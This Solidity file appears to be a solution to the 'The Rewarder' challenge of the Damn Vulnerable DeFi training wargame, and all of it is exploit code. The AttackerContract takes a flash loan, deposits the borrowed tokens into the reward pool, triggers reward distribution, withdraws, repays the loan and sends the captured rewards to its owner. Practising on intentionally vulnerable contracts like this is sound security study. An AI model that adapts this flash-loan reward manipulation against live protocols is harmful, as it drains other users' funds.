// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import {TheRewarderPool} from "src/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "src/the-rewarder/RewardToken.sol";
import {AccountingToken} from "src/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "src/the-rewarder/FlashLoanerPool.sol";

contract AttackerContract  {

    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    RewardToken public immutable rewardToken;
    FlashLoanerPool public immutable flashLoaner;
    address public owner;

    constructor(address liquidityTokenAddress, address rewarderPoolAddress,
        address flashLoanerAddress) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        flashLoaner = FlashLoanerPool(flashLoanerAddress);
        rewardToken = rewarderPool.rewardToken();
    }

    function execute() external {
        liquidityToken.approve(address(rewarderPool), TOKENS_IN_LENDER_POOL);
        flashLoaner.flashLoan(TOKENS_IN_LENDER_POOL);       
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoaner), amount);
    }
}